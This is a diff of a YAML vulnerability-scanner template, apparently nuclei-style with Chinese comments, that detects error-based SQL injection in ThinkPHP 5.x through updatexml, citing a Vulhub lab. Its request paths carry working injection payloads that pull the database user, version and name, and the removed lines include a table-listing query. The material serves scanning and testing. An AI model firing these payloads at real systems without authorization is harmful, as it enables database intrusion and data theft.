@@ -3,44 +3,48 @@ info:
   name: ThinkPHP SQL Injection (updatexml)
   severity: High
   description: |
-    检测 ThinkPHP 5.x 版本中存在的 SQL 注入漏洞，利用 updatexml 函数进行带外数据提取。
+    检测 ThinkPHP 5.x 版本中存在的 SQL 注入漏洞，利用 updatexml 函数进行报错注入。
     该漏洞通常存在于数组参数的 SQL 查询中。
   tags:
     - sqli
     - thinkphp
     - updatexml
-    - oob
   reference:
     - https://vulhub.org/#/environments/thinkphp/in-sqlinjection/
+
 requests:
   - method: GET
     preconditions:
       methods: [GET]
-      # 可以添加技术栈检测，例如：
-      # requires_tech: [php, mysql]
     path:
-      # 目标 Vulhub 环境的精确漏洞路径
       - "{{BaseURL}}/index.php?ids[0,updatexml(0,concat(0xa,{{payload}}),0)]=1"
     payload_sets:
       default:
-        # 注入 user() 函数，尝试提取数据库用户名
         - "user()"
-        # 注入 version() 函数，尝试提取数据库版本
         - "version()"
       aggressive:
         - "user()"
         - "version()"
         - "database()"
-        - "(select group_concat(table_name) from information_schema.tables where table_schema=database())"
     matchers:
-      - type: regex
-        regex:
-          # 匹配 updatexml 报错信息中包含的注入内容
-          - "XPATH syntax error: \\'
-          - "\\n(root@localhost|@localhost)"
-          - "\\n(5.5.62|5.7.22)"
+      - type: word
+        words:
+          - "XPATH syntax error"
+          - "updatexml"
+        condition: or
         part: body
-        condition: and
       - type: status
         status: [500]
-        condition: and
+
+  - method: GET
+    preconditions:
+      methods: [GET]
+    path:
+      - "{{BaseURL}}/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1"
+    matchers:
+      - type: word
+        words:
+          - "root@"
+          - "localhost"
+        condition: or
+        part: body
